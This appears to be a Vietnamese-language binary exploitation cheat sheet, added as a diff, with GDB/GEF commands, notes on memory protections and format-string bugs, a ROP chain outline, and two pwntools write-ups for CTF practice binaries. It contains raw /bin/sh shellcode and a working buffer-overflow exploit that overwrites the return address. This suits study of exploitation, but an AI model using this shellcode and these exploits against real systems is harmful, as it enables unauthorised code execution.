@@ -1,0 +1,99 @@
+shellcode cơ bản:
+\x31\xC0\x31\xC9\x31\xD2\x83\xC0\x0B\x31\xDB\x53\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\xCD\x80
+#!/usr/bin/python3: import đỡ bị lỗi
+target.interactive(): bắt đầu tấn công
+gdb.attach(target): trước target.send() để bắt đầu debug tự mở gdb
+Các chế độ:
+	PIE: bật/tắt bảo vệ bằng lưu trữ động
+		có thể: pie b* địa chỉ: thêm break động, pie run chạy lại với các ô nhớ đó
+	NX: bật/tắt stack có được rwx hay không
+	CANARY: Có gán 1 giá trị kiểm tra trung gian hay không
+	Relro: Các lệnh đọc dữ liệu chỉ có quyền đọc chứ không có quyền thực thi
+gdbgef:
+	r: để chạy chương trình
+	break main: để đặt breakpoint tại main
+	next(n): đến breakpoint tiếp theo, sẽ bị dừng tại các điểm nhập
+	step(c): nhảy từng bước nhưng bỏ qua function call
+	stepi(): nhảy từng bước nhưng sẽ truy cập function call
+	ni: nhảy từng bước debug
+	disass main: để dịch code asm
+	b* main+n: đặt breakpoint động
+	info breakpoints: thông tin các breakpoints
+	delete n: del breakpoint n
+	b* puts: đặt breakpoint tại các hàm puts
+	info registers: chỉ xem các cờ lệnh
+	info frame: có thể xem kết thúc của hàm return tại eip
+	x/s địa chỉ: xem nội dung
+	set {char [độ dài + 1]} địa chỉ = "nội dung"
+	x/g địa chỉ: xem giá trị
+	set *địa chỉ = giá trị
+	j* địa chỉ: nhảy tới địa chỉ
+	info function: liệt kê các hàm
+	tele: để xem stack
+	readelf -s tenfile: hiển thị các function
+Lưu ý:
+	read không cần \n
+	scanf cần \n
+	https://libc.rip/
+Lỗi format string:
+> đối với hàm printf
+%30$s: in ra địa chỉ thứ 30 trên stack
+%s: chuỗi
+%d: số nguyên
+%x: dạng hex | %p là địa chỉ vùng nhờ
+Kĩ thuật ROPChain:
+> Là khi không thể xử dụng shellcode(NX bật hay stack không có quyền thực thi)
+> Là kỹ thuật Thu gom các lệnh có sẵn nối lại với nhau để tạo thành mã thực thi mong muốn
+Quy trình gồm:
+```
+# Move "/bin/sh\x00" to 0x6c1000
+pop rax, 0x6c1000 ; ret
+pop rdx, "/bin/sh\x00" ; ret
+mov qword ptr [rax], rdx ; ret
+
+# Move the needed values into the registers
+pop rax, 0x3b ; ret
+pop rdi, 0x6c1000 ; ret
+pop rsi, 0x0 ; ret
+pop rdx, 0x0 ; ret
+
+# Add syscall
+add(syscall)
+```
+
+> Sử dụng ROPgadget để search các câu lệnh ROPgadget --binary tenfile | grep "keyword"| less
+
+Sử dụng chế độ follow-fork
+> Là chế độ dù đặt debug ở các hàm con nhưng vẫn chỉ tập trung debug ở branch chính
+get > set follow-fork-mode child
+get > show follow-fork
+1 số writeup cơ bản:
+	#!/usr/bin/python3
+	from pwn import *
+	target = process('./boi')
+	payload = b'0'*0x14 + p64(0xcaf3baee)
+	target.send(payload)
+	target.interactive()
+
+	from pwn import *
+	target = process('./shella-easy')
+	#gdb.attach(target, gdbscript = 'b *0x804853e')
+	# Scan in the first line of text, parse out the infoleak
+	leak = target.recvline()
+	leak = leak.strip("Yeah I'll have a ")
+	leak = leak.strip(" with a side of fries thanks\n")
+	shellcodeAdr = int(leak, 16)
+	# Make the payload
+	payload = ""
+	# This shellcode is from: http://shell-storm.org/shellcode/files/shellcode-827.php`
+	payload += "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
+	payload += "0"*(0x40 - len(payload)) # Padding to the local_c variable
+	payload += p32(0xdeadbeef) # Overwrite the local_c variable with 0xdeadbeef
+	payload += "1"*8 # Padding to the return address
+	payload += p32(shellcodeAdr) # Overwrite the return address to point to the start of our shellcode
+
+	# Send the payload
+	target.sendline(payload)
+	target.interactive()
+
+
